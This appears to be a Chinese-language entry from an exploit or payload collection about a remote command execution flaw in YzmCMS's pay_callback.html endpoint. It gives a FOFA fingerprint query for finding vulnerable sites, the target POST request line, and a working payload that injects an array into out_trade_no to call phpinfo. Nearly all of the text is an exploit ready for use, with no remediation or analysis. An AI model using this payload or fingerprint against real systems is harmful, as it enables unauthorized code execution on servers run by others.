# YzmCMSpay_callback.html存在远程命令执行漏洞

YzmCMSpay_callback.html ｜ 命令执行 ｜ —
- **指纹**：`FOFA：app="yzmcms"`
- **请求**：`POST /pay/index/pay_callback.html HTTP/1.1`

**Payload**
```
out_trade_no[0]=eq&out_trade_no[1]=1&out_trade_no[2]=phpinfo
```